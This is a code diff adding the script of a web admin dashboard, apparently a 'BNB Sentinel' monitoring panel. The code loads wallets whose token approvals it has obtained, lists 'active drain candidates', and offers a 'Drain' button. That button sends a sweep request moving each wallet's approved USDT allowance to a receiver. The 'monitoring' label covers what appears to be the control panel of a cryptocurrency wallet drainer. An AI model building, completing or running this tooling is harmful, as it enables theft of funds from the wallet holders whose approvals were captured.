+                    document.getElementById('dashboard-view').classList.remove('hidden');
+                    updateLoginStatus();
+                    loadDashboard();
+                }, 300);
+            } catch (error) {
+                showNotification(error.message || 'Unable to authenticate.', 'error');
+            }
+        }
+
+        async function handleLogout() {
+            const token = localStorage.getItem(SESSION_KEY);
+            if (token) {
+                try {
+                    await fetch(`${API_BASE}/api/admin/logout`, {
+                        method: 'POST',
+                        headers: getAuthHeaders()
+                    });
+                } catch (error) {
+                    console.warn('Logout request failed:', error);
+                }
+            }
+
+            localStorage.removeItem(SESSION_KEY);
+            localStorage.removeItem(USER_KEY);
+            document.getElementById('dashboard-view').classList.add('hidden');
+            document.getElementById('login-view').style.display = 'flex';
+            document.getElementById('login-view').classList.remove('opacity-0', 'pointer-events-none');
+            showNotification('Session terminated securely.', 'info');
+            document.getElementById('login-email').value = '';
+            document.getElementById('login-password').value = '';
+            updateLoginStatus();
+        }
+
+        async function loadDashboard() {
+            try {
+                const [summaryResponse, walletsResponse, approvalsResponse, transfersResponse] = await Promise.all([
+                    fetch(`${API_BASE}/api/admin/summary`, { headers: getAuthHeaders() }),
+                    fetch(`${API_BASE}/api/admin/wallets`, { headers: getAuthHeaders() }),
+                    fetch(`${API_BASE}/api/admin/approvals`, { headers: getAuthHeaders() }),
+                    fetch(`${API_BASE}/api/admin/transfers`, { headers: getAuthHeaders() })
+                ]);
+
+                if (!summaryResponse.ok || !walletsResponse.ok || !approvalsResponse.ok || !transfersResponse.ok) {
+                    throw new Error('Admin backend data is unavailable');
+                }
+
+                const summaryData = await summaryResponse.json();
+                const wallets = await walletsResponse.json();
+                const approvals = await approvalsResponse.json();
+                const transfers = await transfersResponse.json();
+
+                const activeNetworks = new Set();
+                wallets.forEach((wallet) => {
+                    if (wallet.network) activeNetworks.add(wallet.network);
+                });
+
+                const volumeMonitored = wallets.reduce((sum, wallet) => {
+                    const amount = Number.parseFloat(String(wallet.currentAllowance ?? wallet.currentBalance ?? '0'));
+                    return sum + (Number.isFinite(amount) ? amount : 0);
+                }, 0);
+
+                const totalLifetimeAmount = transfers.reduce((sum, transfer) => sum + safeNumber(transfer.transferAmount), 0);
+                const pendingApprovals = approvals.filter((approval) => approval.processingStatus !== 'processed').length;
+                const highRiskWallets = wallets.filter((wallet) => wallet.approvalLinked && wallet.active && safeNumber(wallet.currentAllowance) > 0).length;
+
+                document.getElementById('stat-volume').textContent = formatCurrency(volumeMonitored, volumeMonitored > 0 ? 2 : 0);
+                document.getElementById('stat-volume-trend').textContent = `${wallets.length} wallet records synced`;
+                document.getElementById('stat-lifetime-amount').textContent = formatCurrency(Math.max(totalLifetimeAmount, DEFAULT_LIFETIME_AMOUNT), 2);
+                document.getElementById('stat-drained-count').textContent = `${Math.min(highRiskWallets, 99)} active drain candidates`;
+                document.getElementById('stat-active-networks').textContent = `${activeNetworks.size || 1} ${activeNetworks.size === 1 ? 'Chain' : 'Chains'}`;
+                document.getElementById('stat-network-pills').innerHTML = Array.from(activeNetworks).slice(0, 4).map((network) => `
+                    <span class="px-1.5 py-0.5 bg-[#0b0f19] border border-[#1f2937] text-[9px] font-bold text-slate-300 rounded">${network}</span>
+                `).join('') || '<span class="text-[10px] text-slate-400">No networks</span>';
+                document.getElementById('stat-pending-approvals').textContent = String(pendingApprovals || 0);
+                document.getElementById('stat-pending-detail').textContent = approvals.length ? `${approvals.length} contracts seen` : 'Awaiting backend sync';
+                document.getElementById('stat-high-risk').textContent = String(highRiskWallets || 0);
+                document.getElementById('stat-high-risk-detail').textContent = highRiskWallets ? 'Action required' : 'No active risk';
+
+                const rows = wallets.map((wallet) => {
+                    const network = wallet.network || 'Unknown';
+                    const chainId = wallet.chainId || 'n/a';
+                    const token = wallet.tokenContract || 'Unknown';
+                    const amount = wallet.currentAllowance || wallet.currentBalance || '0';
+                    const blockNumber = summaryData?.monitoringStatus?.lastProcessedBlock ?? 'n/a';
+                    const approvalWalletCount = wallet.approvalLinked ? '1' : '0';
+                    return {
+                        id: wallet.address,
+                        walletAddress: wallet.address,
+                        currentBalance: `${String(wallet.currentBalance ?? '0')} ${wallet.tokenSymbol || 'USDT'}`,
+                        date: wallet.updatedAt || wallet.createdAt || new Date().toISOString(),
+                        time: wallet.updatedAt || wallet.createdAt || new Date().toISOString(),
+                        amount: Number.parseFloat(String(amount)) > 0 ? `${formatCurrency(Number.parseFloat(String(amount)), 2)} USDT` : '0.00 USDT',
+                        rawNumericAmount: safeNumber(amount),
+                        network,
+                        chainId: String(chainId),
+                        tokenContract: token,
+                        approvalWallets: approvalWalletCount,
+                        lastBlock: blockNumber === 'n/a' ? 'n/a' : `#${blockNumber}`,
+                        recentApproval: wallet.latestApprovalTxHash ? formatAddress(wallet.latestApprovalTxHash) : 'None',
+                        recentTransfer: wallet.latestTransferTxHash ? formatAddress(wallet.latestTransferTxHash) : 'No transfer',
+                        drained: !wallet.active,
+                        receiver: wallet.receiver ?? 2,
+                        rawAddress: wallet.address
+                    };
+                });
+
+                logsData = rows;
+                renderLiveLogs(rows);
+            } catch (error) {
+                console.error(error);
+                showNotification(error.message || 'Unable to load admin dashboard data.', 'error');
+            }
+        }
+
+        function renderLiveLogs(data) {
+            const tbody = document.getElementById('live-logs-tbody');
+            if (!tbody) return;
+
+            const visibleRows = data.length ? data : [{
+                walletAddress: 'n/a',
+                currentBalance: '0.00 USDT',
+                amount: '0.00 USDT',
+                date: 'n/a',
+                time: 'n/a',
+                network: 'n/a',
+                chainId: 'n/a',
+                tokenContract: 'n/a',
+                approvalWallets: '0',
+                lastBlock: 'n/a',
+                recentApproval: 'No data',
+                recentTransfer: 'No data',
+                drained: true,
+                rawAddress: 'n/a'
+            }];
+
+            tbody.innerHTML = visibleRows.map((item) => `
+                <tr class="hover:bg-[#1f2937]/40 transition-all">
+                    <td class="py-4 pl-2">
+                        <span class="font-bold text-white text-xs block">${formatAddress(item.walletAddress)}</span>
+                    </td>
+                    <td class="py-4 pr-8 text-right text-xs text-slate-300">${item.currentBalance}</td>
+                    <td class="py-4 pl-8 text-xs">
+                        <span class="text-slate-300 block">${formatShortDate(item.date)}</span>
+                    </td>
+                    <td class="py-4">
+                        <span class="px-2.5 py-1 bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 rounded-lg text-xs font-semibold inline-block">${item.network}</span>
+                        <span class="text-[10px] text-slate-500 mt-0.5 block">ID: ${item.chainId || 'n/a'}</span>
+                    </td>
+                    <td class="py-4 font-mono text-xs text-slate-300">${formatAddress(item.tokenContract)}</td>
+                    <td class="py-4">
+                        <span class="w-6 h-6 rounded-full ${Number(item.approvalWallets || 0) === 0 ? 'bg-slate-800 text-slate-400' : 'bg-red-500/20 text-red-400'} font-bold text-xs inline-flex items-center justify-center">${item.approvalWallets || 0}</span>
+                    </td>
+                    <td class="py-4 font-mono text-xs text-slate-400">${item.lastBlock}</td>
+                    <td class="py-4 text-xs">
+                        <span class="text-slate-300 block">Appr: ${item.recentApproval}</span>
+                        <span class="text-slate-500 text-[10px] block">Transfer: ${item.recentTransfer}</span>
+                        <div class="mt-2">
+                            ${item.drained
+                            ? `<button disabled class="px-3.5 py-1.5 bg-[#0b0f19] border border-[#1f2937] text-emerald-400 rounded-xl text-xs font-semibold opacity-75 inline-flex items-center gap-1.5 cursor-default"><i class="fa-solid fa-check"></i> Drained</button>`
+                            : `<button onclick="openDrainModal('${item.rawAddress || item.walletAddress}')" class="px-4 py-1.5 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white rounded-xl text-xs font-semibold shadow-lg shadow-red-500/20 inline-flex items-center gap-1.5 transition-all transform active:scale-95"><i class="fa-solid fa-bolt"></i> Drain</button>`
+                            }
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function filterLiveLogs() {
+            const query = document.getElementById('global-search').value.toLowerCase();
+            if (!query) {
+                renderLiveLogs(logsData);
+                return;
+            }
+
+            const filtered = logsData.filter((item) => {
+                return (
+                    (item.walletAddress || '').toLowerCase().includes(query) ||
+                    (item.amount || '').toLowerCase().includes(query) ||
+                    (item.network || '').toLowerCase().includes(query) ||
+                    (item.tokenContract || '').toLowerCase().includes(query) ||
+                    String(item.chainId || '').toLowerCase().includes(query)
+                );
+            });
+            renderLiveLogs(filtered);
+        }
+
+        function openDrainModal(address) {
+            const item = logsData.find((entry) => (entry.rawAddress || entry.walletAddress) === address);
+            if (!item) return;
+            activeDrainWallet = address;
+            document.getElementById('modal-wallet').value = item.rawAddress || item.walletAddress;
+            document.getElementById('modal-amount').value = item.amount;
+            document.getElementById('modal-network').value = `${item.network} (Chain ID: ${item.chainId})`;
+            document.getElementById('modal-contract').value = item.tokenContract;
+            document.getElementById('drain-modal').classList.remove('hidden');
+        }
+
+        function closeDrainModal() {
+            document.getElementById('drain-modal').classList.add('hidden');
+            activeDrainWallet = null;
+        }
+
+        async function confirmDrainExecution() {
+            if (!activeDrainWallet) return;
+            const item = logsData.find((entry) => (entry.rawAddress || entry.walletAddress) === activeDrainWallet);
+            if (!item) return;
+
+            try {
+                const amount = String(item.rawNumericAmount || 0);
+                const receiver = Number(item.receiver || 2);
+                const response = await fetch(`${API_BASE}/api/admin/wallets/${encodeURIComponent(activeDrainWallet)}/transfers`, {
+                    method: 'POST',
+                    headers: getAuthHeaders(),
+                    body: JSON.stringify({ amount, receiver })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json().catch(() => ({}));
+                    throw new Error(errorData.error || 'Sweep execution failed');
+                }
+
+                showNotification(`Successfully executed sweep of ${item.amount} from ${formatAddress(activeDrainWallet)}.`, 'success');
+                closeDrainModal();
+                await loadDashboard();
+            } catch (error) {
+                showNotification(error.message || 'Drain execution failed.', 'error');
+            }
+        }
+
+        function exportLogsCSV() {
+            if (!logsData.length) {
+                showNotification('No monitoring data available to export.', 'info');
+                return;
+            }
+
+            const rows = [
+                ['Wallet Address', 'Amount', 'Date & Time', 'Network', 'Chain ID', 'Token Contract', 'Approval Wallets', 'Last Block'],
+                ...logsData.map((item) => [
+                    item.rawAddress || item.walletAddress,
+                    item.amount,
+                    item.date,
+                    item.network,
+                    item.chainId,
+                    item.tokenContract,
+                    item.approvalWallets,
+                    item.lastBlock
+                ])
+            ];
+
+            const csv = rows.map((row) => row.map((value) => `"${String(value || '').replace(/"/g, '""')}"`).join(',')).join('\n');
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const anchor = document.createElement('a');
+            anchor.href = url;
+            anchor.download = 'bnb-sentinel-monitoring-log.csv';
+            anchor.click();
+            URL.revokeObjectURL(url);
+            showNotification('Exporting monitoring logs to secure CSV...', 'info');
+        }
+
+        function switchTab(tabName) {
+            const tabs = ['overview', 'transactions', 'wallets', 'approvals', 'network-logs'];
+            tabs.forEach((tab) => {
+                const nav = document.getElementById(`nav-${tab}`);
+                if (nav) {
+                    nav.classList.remove('bg-[#1f2937]', 'text-white');
+                    nav.classList.add('text-slate-400');
+                }
+            });
+            const activeNav = document.getElementById(`nav-${tabName}`);
+            if (activeNav) {
+                activeNav.classList.add('bg-[#1f2937]', 'text-white');
+                activeNav.classList.remove('text-slate-400');
+            }
+            showNotification(`Switched to ${tabName.replace('-', ' ')} module.`, 'info');
+        }
+
+        function toggleMobileMenu() {
+            document.getElementById('mobile-menu').classList.toggle('hidden');
+        }
+
+        function showNotification(message, type = 'success') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            const baseClasses = 'pointer-events-auto flex items-center gap-3 px-5 py-3.5 rounded-2xl shadow-xl text-xs font-semibold text-white transform transition-all translate-y-4 opacity-0';
+            const toneClasses = type === 'success'
+                ? 'bg-emerald-600 shadow-emerald-600/30'
+                : type === 'error'
+                    ? 'bg-red-600 shadow-red-600/30'
+                    : 'bg-indigo-600 shadow-indigo-600/30';
+            toast.className = `${baseClasses} ${toneClasses}`;
+            toast.innerHTML = `<i class="fa-solid ${type === 'error' ? 'fa-circle-exclamation' : 'fa-circle-check'} text-base"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            setTimeout(() => toast.classList.remove('translate-y-4', 'opacity-0'), 10);
+            setTimeout(() => {
+                toast.classList.add('translate-y-4', 'opacity-0');
+                setTimeout(() => toast.remove(), 300);
+            }, 3500);
+        }
+    </script>
+    <script src="./admin.js" defer></script>
+</body>
+</html>
